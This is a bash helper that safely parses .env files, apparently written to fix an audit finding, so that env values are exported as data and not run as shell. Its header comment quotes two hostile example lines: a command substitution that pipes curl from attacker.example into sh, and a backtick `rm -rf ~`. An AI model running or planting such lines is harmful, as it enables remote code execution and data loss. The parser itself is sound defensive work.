# shellcheck shell=bash
# Strict .env parser (audit L-14). Source this file, then call:
#     kryptolog_load_env backend/.env
#
# It replaces `set -a; source .env; set +a`, which RUNS the env file as a bash
# script. An env file is data, not code — it holds a pasted secret from
# generate_server_keys.py, a connection string from a secret manager, or
# whatever a deploy pipeline wrote — yet under `source` every one of these
# executes before the backend ever starts:
#
#     KRYPTOLOG_JWT_SECRET=$(curl attacker.example/x | sh)
#     DATABASE_URL=`rm -rf ~`
#     VAPID_PUBLIC_KEY=<your-vapid-public-key>      # redirection, not a value
#
# The last one is not even hostile: it is the placeholder shipped in
# .env.example, and `source` treats the angle brackets as redirections.
#
# Deliberate differences from `source`, all in the direction of "data, not code":
#   • no command substitution, no backticks, no process substitution
#   • no variable interpolation — KEY="$HOME/x" exports those 8 literal chars
#   • no backslash escapes inside double quotes
#   • no redirections, no line continuations, no multi-line values
# Kept, because real .env files rely on them: `export ` prefixes, one layer of
# surrounding quotes, and ` #` inline comments on unquoted values.
#
# A malformed line is reported with its line number and skipped. Under `source`
# the same line aborted the read or, worse, half-executed.

kryptolog_load_env() {
    local file="$1"
    [ -f "$file" ] || return 0

    local line key value quote lineno=0

    # `|| [ -n "$line" ]` so a final line with no trailing newline is not lost.
    while IFS= read -r line || [ -n "$line" ]; do
        lineno=$((lineno + 1))

        # Trim surrounding whitespace. [:space:] covers \r, so a file saved with
        # CRLF endings loads correctly instead of appending \r to every value.
        line="${line#"${line%%[![:space:]]*}"}"
        line="${line%"${line##*[![:space:]]}"}"

        [ -z "$line" ] && continue
        [ "${line#\#}" != "$line" ] && continue

        # Optional `export ` prefix.
        if [ "${line#export }" != "$line" ]; then
            line="${line#export }"
            line="${line#"${line%%[![:space:]]*}"}"
        fi

        case "$line" in
            *=*) ;;
            *) echo "  warning: $file:$lineno: no '=', line skipped" >&2; continue ;;
        esac

        key="${line%%=*}"
        value="${line#*=}"

        # The name has to be a shell identifier. The empty case is listed
        # explicitly: a bare `=value` line leaves an empty key, which the
        # bracket patterns below cannot match (they need at least one char).
        case "$key" in
            "" | [!A-Za-z_]* | *[!A-Za-z0-9_]*)
                echo "  warning: $file:$lineno: invalid variable name '$key', line skipped" >&2
                continue ;;
        esac

        quote="${value:0:1}"
        if [ ${#value} -ge 2 ] && { [ "$quote" = '"' ] || [ "$quote" = "'" ]; } \
           && [ "${value: -1}" = "$quote" ]; then
            # Quoted: content is verbatim, so a secret with a trailing space or
            # a leading '#' survives intact.
            value="${value:1:${#value}-2}"
        else
            # Unquoted: ' #' starts a comment, matching both `source` and
            # python-dotenv. Bare '#' does not, so an in-password '#' is safe
            # (postgres://user:pa#ss@host keeps its own).
            case "$value" in
                *" #"*) value="${value%%" #"*}" ;;
            esac
            value="${value%"${value##*[![:space:]]}"}"
        fi

        # `export` receives "name=value" as ONE word, so the value is assigned
        # as data and never re-parsed as shell. This is the whole fix.
        export "$key=$value"
    done < "$file"
}
